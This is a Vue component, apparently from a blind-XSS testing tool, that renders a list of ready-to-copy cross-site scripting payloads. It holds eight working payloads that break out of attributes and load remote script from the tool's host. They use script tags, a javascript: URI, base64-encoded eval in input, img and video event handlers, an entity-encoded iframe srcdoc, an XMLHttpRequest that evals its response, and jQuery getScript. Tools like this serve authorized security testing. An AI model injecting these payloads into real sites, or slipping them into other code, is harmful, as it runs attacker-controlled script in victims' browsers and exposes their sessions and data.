<template>
  <section class="flex flex-col gap-4">
    <div
      v-for="(payload, index) in payloads"
      :key="index"
      class="flex flex-col gap-4 bg-card rounded p-4"
    >
      <div v-html="payload.header"></div>
      <label class="text-secondary uppercase">{{ payload.label }}</label>
      <input type="text" class="bg-card-foreground/20 p-2 rounded" :value="payload.payload" />
      <BasicButton
        class="flex max-w-52 justify-center items-center transition-all duration-300"
        @click="copyClipboard(payload.payload, index)"
      >
        <Transition name="fade-scale" mode="out-in">
          <FontAwesomeIcon
            :key="copiedIndex === index ? 'check' : 'copy'"
            :icon="copiedIndex === index ? ['solid', 'check'] : ['solid', 'copy']"
            class="mr-2 text-base"
          />
        </Transition>
        Copy payload
      </BasicButton>
    </div>
  </section>
</template>

<script setup lang="ts">
import BasicButton from '@/components/BasicButton.vue'
import { html_encode, urlsafe_base64_encode } from '@/utils'
import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome'
import { ref } from 'vue'

const base_domain = window.location.host

const payloads = [
  {
    payload: `"><script src="https://${base_domain}"><\/script>`,
    header: 'Basic <code>&lt;script&gt;</code> Tag Payload',
    label: 'Classic payload',
  },
  {
    payload: `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://${base_domain}\\';document.body.appendChild(a)')`,
    header: '<code>javascript:</code> URI Payload',
    label: 'Link-based XSS',
  },
  {
    header: '<code>&lt;input&gt;</code> Tag Payload',
    label: 'HTML5 input-based payload',
    payload: `"><input onfocus=eval(atob(this.id)) id=${html_encode(
      urlsafe_base64_encode(
        `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
      ),
    )} autofocus>`,
  },
  {
    //func: this.basic_script,
    header: '<code>&lt;img&gt;</code> Tag Payload',
    label: 'Image-based payload',
    payload: `"><img src=x id=${html_encode(
      urlsafe_base64_encode(
        `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
      ),
    )} onerror=eval(atob(this.id))>`,
  },
  {
    //func: this.basic_script,
    header: '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
    label: 'Video-based payload',
    payload: `"><video><source onerror=eval(atob(this.id)) id=${html_encode(
      urlsafe_base64_encode(
        `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
      ),
    )}>`,
  },
  {
    //func: this.basic_script,
    header: '<code>&lt;iframe srcdoc=</code> Tag Payload',
    label: 'iframe-based payload',
    payload: `"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;${base_domain}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">`,
  },
  {
    //func: this.basic_script,
    header: 'XMLHttpRequest Payload',
    label: 'Inline execution chainload payload',
    payload: `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://${base_domain}");a.send();<\/script>`,
  },
  {
    //func: this.basic_script,
    header: '<code>$.getScript()</code> (jQuery) Payload',
    label: 'Chainload payload for sites with jQuery',
    payload: `<script>$.getScript("https://${base_domain}")<\/script>`,
  },
]

const copiedIndex = ref<number | null>(null)
let copyTimeout: number | null = null

const copyClipboard = async (value: string, index: number) => {
  await navigator.clipboard.writeText(value || '')
  copiedIndex.value = index
  if (copyTimeout) clearTimeout(copyTimeout)
  copyTimeout = window.setTimeout(() => {
    copiedIndex.value = null
  }, 800)
}
</script>

<style scoped>
@reference "../assets/main.css";

code {
  @apply bg-card-foreground/20 text-secondary p-1 rounded;
}

.fade-scale-enter-active,
.fade-scale-leave-active {
  @apply transition-all duration-300 ease-in-out;
}

.fade-scale-enter-from,
.fade-scale-leave-to {
  @apply opacity-0 scale-75;
}

.fade-scale-enter-to,
.fade-scale-leave-from {
  @apply opacity-100 scale-100;
}
</style>
